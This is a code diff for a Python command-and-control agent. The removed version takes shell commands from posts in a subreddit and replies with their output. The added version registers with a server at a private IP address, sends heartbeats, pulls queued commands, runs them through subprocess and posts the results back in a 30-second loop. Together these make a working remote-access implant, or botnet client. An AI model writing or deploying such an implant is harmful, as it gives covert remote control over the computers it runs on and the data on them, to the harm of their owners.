@@ -1,22 +1,32 @@
-import praw, json, subprocess, time, uuid, socket, requests, uuid
-
-# Load credentials
-with open("config.json") as f:
-    creds = json.load(f)
-
-reddit = praw.Reddit(
-    client_id=creds["client_id"],
-    client_secret=creds["client_secret"],
-    username=creds["username"],
-    password=creds["password"],
-    user_agent=creds["user_agent"]
-)
+import json, subprocess, time, uuid, socket, requests
 
 SERVER_URL = "http://192.168.1.76:5000"
-SUBREDDIT = "taskdropbox"
-mac = hex(uuid.getnode())
-AGENT_ID = f"{socket.gethostname()}-{mac}"
-processed_posts = set()
+hostname = socket.gethostname()
+AGENT_ID = f"Agent-{uuid.uuid4().hex[:6]}"
+
+def register_agent():
+    r = requests.post(f"{SERVER_URL}/register", json={"agent_id": AGENT_ID, "hostname": hostname})
+    print(f"[+] Registered: {AGENT_ID}, response={r.json()}")
+
+def heartbeat():
+    r = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": AGENT_ID})
+    if r.status_code != 200:
+        return
+    
+    response = r.json()
+
+    # If server has commands for this agent
+    if response.get("agent_id") == AGENT_ID:
+        commands = response.get("commands", [])
+        beacon_command(commands)
+
+def beacon_command(commands):
+    for cmd in commands:
+        output = execute_command(cmd["command"])
+        requests.post(f"{SERVER_URL}/result", json={
+            "command_id": cmd["command_id"],
+            "result": output
+        })
 
 def execute_command(command):
     try:
@@ -27,50 +37,8 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         return e.output.decode(errors="ignore")
 
-def beacon():
-    subreddit = reddit.subreddit(SUBREDDIT)
-    resp = requests.get(f"{SERVER_URL}/processed").json()
-
-    for post in subreddit.new(limit=5):
-        already_done = resp.get(post.id, [])
-
-        if AGENT_ID in already_done:
-            continue  # this agent already did it
-
-        title = post.title.strip()
-
-        # Broadcast case
-        if title.upper() == "ALL":
-            command = post.selftext.strip()
-            output = execute_command(command)
-            post.reply(f"{AGENT_ID}: {output}")
-            requests.post(f"{SERVER_URL}/processed", json={"post_id": post.id, "agent_id": AGENT_ID})
-
-        else:
-            # Split by comma for single/multi targets
-            targets = [t.strip() for t in title.split(",")]
-            if AGENT_ID in targets:
-                command = post.selftext.strip()
-                output = execute_command(command)
-                post.reply(f"{AGENT_ID}: {output}")
-                requests.post(f"{SERVER_URL}/processed", json={"post_id": post.id, "agent_id": AGENT_ID})
-
-                      
-            
-def register_agent():
-    register = requests.post(f"{SERVER_URL}/register", json={"Agent Id": AGENT_ID})
-    
-
-def heartbeat():
-    echo = requests.post(f"{SERVER_URL}/beacon", json={"Agent Id": AGENT_ID})
-    
 if __name__ == "__main__":
-    register_agent()  # startup
+    register_agent()
     while True:
-        heartbeat()  # update every loop
-        beacon()
-        time.sleep(30)    
-     
-    
-
-    
+        heartbeat()   # updates status + pulls + executes commands
+        time.sleep(30)
